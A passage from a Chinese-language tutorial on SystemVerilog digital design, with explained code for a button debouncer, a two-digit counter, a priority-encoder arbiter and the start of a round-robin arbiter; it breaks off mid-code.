<code>ones_reg</code> 和 <code>tens_reg</code> 寄存器, 实现加一和清零的操作, 并且手动处理进位.</p><p>用一个寄存器检测按下的计数按钮, 即 <code>button_debounced</code> 从 <code>0</code> 变成 <code>1</code>: </p><ol><li>寄存器 <code>button_debounced_reg</code> 保存上一周期的 <code>button_debounced</code>.</li><li>如果 <code>button_debounced == 1 &amp;&amp; button_debounced_reg == 0</code>, 说明检测到了从 <code>0</code> 变成了 <code>1</code>.</li></ol><p>最后是 <code>ones_reg</code> 和 <code>tens_reg</code>, 连接到输出的 <code>ones</code> 和 <code>tens</code> 信号即可. </p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><p>首先是消抖电路: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> debouncer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> button_debounced<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> last_button_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> button_debounced_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      last_button_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">16'b0</span><span class="token punctuation">;</span>      button_debounced_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      last_button_reg <span class="token operator">&lt;=</span> button<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>button <span class="token operator">==</span> last_button_reg<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">16'd10000</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>          button_debounced_reg <span class="token operator">&lt;=</span> last_button_reg<span class="token punctuation">;</span>        <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>          counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">16'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">16'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> button_debounced <span class="token operator">=</span> button_debounced_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着是计数器部分: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> counter <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button_debounced<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> button_debounced_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      ones_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      tens_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      button_debounced_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      button_debounced_reg <span class="token operator">&lt;=</span> button_debounced<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>button_debounced <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>button_debounced_reg<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ones_reg <span class="token operator">==</span> <span class="token number">4'd9</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>          ones_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>          tens_reg <span class="token operator">&lt;=</span> tens_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>          ones_reg <span class="token operator">&lt;=</span> ones_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> ones <span class="token operator">=</span> ones_reg<span class="token punctuation">;</span>  <span class="token keyword">assign</span> tens <span class="token operator">=</span> tens_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后再用一个顶层 <code>module</code> 把两个模块合起来: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> counter_top <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">wire</span> button_debounced<span class="token punctuation">;</span>  debouncer debouncer_component <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button</span><span class="token punctuation">(</span>button<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button_debounced</span><span class="token punctuation">(</span>button_debounced<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  counter counter_component <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button_debounced</span><span class="token punctuation">(</span>button_debounced<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">ones</span><span class="token punctuation">(</span>ones<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">tens</span><span class="token punctuation">(</span>tens<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>button_debounced</code> 是两个内部模块之间的, 所以声明了一个 <code>wire</code> 把两个模块的输入输出连起来, 其他信号则是直接连接到顶层模块的输入输出信号. </p><h2 id="无状态仲裁器-优先级编码器"><a href="#无状态仲裁器-优先级编码器" class="headerlink" title="无状态仲裁器 (优先级编码器)"></a>无状态仲裁器 (优先级编码器)</h2><h3 id="需求-4"><a href="#需求-4" class="headerlink" title="需求"></a>需求</h3><p>设计一个仲裁器: 假想多个用户同时访问同一个资源, 但是资源同时只能给一个用户使用, 这时需要使用一个仲裁器, 选择出一个幸运儿, 其他用户则需要等待. 假设资源的访问是 “立即” 完成的, 资源正在使用的时候, 使用权不会被其他用户抢走.</p><p>输入: </p><ol><li><code>request</code>: 宽度为 4, 每一位 1 表示对应的用户请求访问资源, 0 表示不请求.</li></ol><p>输出: </p><ol><li><code>valid</code>: 1 表示有用户请求访问资源, 0 表示无用户请求访问资源.</li><li><code>user</code>: 宽度为 2, 如果有用户请求访问资源时, 输出获得资源的用户的编号.</li></ol><h3 id="电路-4"><a href="#电路-4" class="headerlink" title="电路"></a>电路</h3><p>仲裁器的输出完全由输入决定, 没有内部状态, 所以可以用<strong>组合逻辑</strong>来实现.  <code>valid</code> 信号比较简单, 直接把所有输入用或门连接在一起即可. 如何找到请求的用户里, 编号最小的那一个? 可以分情况讨论: </p><ol><li><code>request=0000</code>, 输出的 <code>user</code> 可以是任意值.</li><li><code>request=???1</code>, 此时 <code>user=0, valid=1</code>.</li><li><code>request=??10</code>, 此时 <code>user=1, valid=1</code>.</li><li><code>request=?100</code>, 此时 <code>user=2, valid=1</code>.</li><li><code>request=1000</code>, 此时 <code>user=3, valid=1</code>.</li></ol><p>上面五个条件遍历了所有可能的情况. 在实现组合逻辑的时候, 一定要<strong>考虑所有情况, 并且每个情况下每个信号都要得到一个结果</strong>, 否则不可避免会引入锁存器.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013747.svg" alt=""></p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> priority_encoder <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    valid_comb <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>    <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>      <span class="token number">4'b???1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b??10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b?100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>      <span class="token number">4'b1000</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>        valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>        user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">endcase</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> valid <span class="token operator">=</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现组合逻辑电路的一种方法是用 <code>assign</code>, 如 <code>assign valid = |request</code>; 但是涉及更复杂的组合逻辑时, 会比较复杂. 可以在 <code>always_comb</code> 块中灵活地使用各种条件语句, 包括 <code>casez</code> 语句, 首先设置了一个默认的结果, 这样如果下面所有的 <code>casez</code> 都不满足, 那么输出的就是默认值.</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>总结规律: </p><ol><li>确定输入输出;</li><li>确定需要哪些寄存器;</li><li>实现时序逻辑;</li><li>实现组合逻辑.</li></ol><h2 id="循环优先级仲裁器"><a href="#循环优先级仲裁器" class="headerlink" title="循环优先级仲裁器"></a>循环优先级仲裁器</h2><h3 id="需求-5"><a href="#需求-5" class="headerlink" title="需求"></a>需求</h3><p>实现一个循环优先级仲裁器 (round robin arbiter), 根据最后一次获取资源的用户, 决定下一次获取资源的优先级. 当一个用户 <code>A</code> 不再获取资源 (对应位 <code>request</code> 从 <code>1</code> 变成 <code>0</code>) 时, 重新选择一个可以获取资源的用户, 优先级是从 <code>A</code> 的下一个用户开始为最高优先级, 如果溢出了就绕回.</p><p>输入: </p><ol><li><code>request</code>: 宽度为 4, 每一位 1 表示对应的用户请求访问资源, 0 表示不请求.</li><li><code>clock</code>: 1MHz 的时钟.</li><li><code>reset</code>: 复位信号.</li></ol><p>输出: </p><ol><li><code>valid</code>: 1 表示有用户请求访问资源, 0 表示无用户请求访问资源.</li><li><code>user</code>: 宽度为 2, 如果有用户请求访问资源时, 输出获得资源的用户的编号.</li></ol><h3 id="波形-2"><a href="#波形-2" class="headerlink" title="波形"></a>波形</h3><p>相比上一个例子, 有两个比较大的区别: </p><ol><li>无状态仲裁器中, 如果出现了优先级更高的用户, 资源的访问权立即切换; 循环优先级仲裁器中, 只有用户放弃了请求才会切换;</li><li>仲裁时, 优先级根据最后一次获得访问权的用户来决定.</li></ol><h3 id="电路-5"><a href="#电路-5" class="headerlink" title="电路"></a>电路</h3><p>由于优先级和最后一次获得访问权的用户有关, 需要<strong>时序逻辑</strong>实现. 用 <code>user_reg</code> 记录最后一次获得访问权的用户编号: </p><ol><li>什么时候更新: 上一个周期没有用户获得访问权, 这个周期 <code>request</code> 不等于零; 当前周期获得访问权的用户对应的 <code>request</code> 位由 <code>1</code> 变成了 <code>0</code>.</li><li>更新成什么: 按照优先级顺序在 <code>request</code> 里选出目前优先级最高的用户.</li></ol><p>由此, 在这一类内部具有状态, 又需要在输入变化的同一个周期输出的情况, 需要用时序逻辑来保存状态, 同时用组合逻辑来实现同周期的输出, 把二者结合起来.</p><p>第一部分是修改后的优先级编码器, 额外添加输入 <code>last_user</code> 表示最后一次获得访问权的用户编号. </p><p>第二部分是维护 <code>user_reg</code> 状态. 第一个模块是上面提到的修改后的优先级编码器, 第二个模块是整体的循环优先级仲裁器, 内部例化第一个模块. </p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><p>实现第一部分逻辑, 根据最后一次获取资源的用户编号确定优先级的优先级编码器: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> rr_priority_encoder <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> last_user<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token important">always_comb</span> <span class="token keyword">begin</span>    valid_comb <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>    <span class="token comment">// naive way</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd3</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b???1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b??10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b?100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b1000</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd0</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b??1?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b?10?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b100?</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0001</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd1</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b?1??</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b10??</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b00?1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0010</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>last_user <span class="token operator">==</span> <span class="token number">2'd2</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>      <span class="token keyword">casez</span> <span class="token punctuation">(</span>request<span class="token punctuation">)</span>        <span class="token number">4'b1???</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd3</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0??1</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0?10</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>        <span class="token number">4'b0100</span><span class="token punctuation">:</span> <span class="token keyword">begin</span>          valid_comb <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>          user_comb <span class="token operator">=</span> <span class="token number">2'd2</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">endcase</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> valid <span class="token operator">=</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">assign</span> user <span class="token operator">=</span> user_comb<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着是循环优先级仲裁器: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> rr_arbiter <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> priority_encoder_user_comb<span class="token punctuation">;</span>  rr_priority_encoder rr_priority_encoder_inst <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">last_user</span><span class="token punctuation">(</span>user_reg<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">valid</span><span class="token punctuation">(</span>valid<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">user</span><span class="token punctuation">(</span>priority_encoder_user_comb<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      user_reg <span class="token operator">&lt;=</span> <span class="token number">2'd0</span><span class="token punctuation">;</span>      valid_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      valid_reg <span class="token operator">&lt;=</span> valid<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>valid_reg <span class="token operator">&amp;&amp;</span> valid<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token comment">// case 1: non valid -&gt; valid</span>        user_reg <span class="token operator">&lt;=</span> priority_encoder_user_comb<span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valid_reg <span class="token operator">&amp;&amp;</span> valid <span class="token operator">&amp;&amp;</span> request<span class="token punctuation">[</span>user_reg<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token 